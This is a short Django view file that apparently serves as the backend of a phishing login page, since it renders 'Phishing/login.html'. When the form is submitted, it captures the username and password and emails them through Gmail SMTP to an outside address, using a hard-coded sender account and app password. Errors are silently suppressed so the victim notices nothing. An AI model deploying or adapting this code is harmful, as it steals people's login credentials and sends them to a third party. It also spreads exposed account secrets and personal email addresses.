import smtplib
from django.shortcuts import render
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('login')
        password = request.POST.get('password')

        print(username)
        print(password)

        recipient_email = '215541065@firat.edu.tr'
        sender_email = 'nktkargo@gmail.com'
        sender_email_password = 'luzs jusz gakl sabz'

        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        smtp_username = sender_email
        smtp_password = sender_email_password

        subject = f"New İnformation"
        message = f"Username : {username}\nPassword : {password}"

        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = recipient_email
        msg["Subject"] = subject
        msg.attach(MIMEText(message, "plain"))

        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(smtp_username, smtp_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
            server.quit()
        except Exception:
            pass
    return render(request, 'Phishing/login.html')
